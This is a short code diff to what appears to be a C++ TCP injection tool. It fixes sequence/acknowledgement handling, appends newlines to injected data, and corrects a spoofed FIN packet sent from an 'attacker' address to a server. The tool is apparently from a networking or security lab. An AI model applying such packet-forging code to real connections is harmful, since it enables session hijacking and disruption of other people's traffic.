@@ -5,6 +5,8 @@
 #include <random>
 #include <thread>
 
+#include <poll.h>
+
 #include "tcp-interface.hpp"
 #include "tcp-packet.hpp"
 
@@ -103,7 +105,7 @@ int main(int argc, char **argv) {
                   .seqno = true_seqno,
                   .ackno = true_ackno,
                   .psh = true,
-                  .data = line,
+                  .data = line + "\n",
               });
 
       std::optional<TCPPacket> tcp_response = config.topology.interface.receive(
@@ -112,7 +114,7 @@ int main(int argc, char **argv) {
         return true;
       },
       config.timeout);
-      if (!tcp_response.has_value()) {
+      if (tcp_response.has_value()) {
         // Success case only for now
         true_seqno = tcp_response->ackno.value();
       }
@@ -121,8 +123,8 @@ int main(int argc, char **argv) {
     send_pkt(config, TCPPacket{
                       .src = attacker_addr,
                       .dst = config.topology.server_addr,
-                      .seqno = true_ackno,
-                      .ackno = true_seqno,
+                      .seqno = true_seqno,
+                      .ackno = true_ackno,
                       .fin = true,
                   });
   }
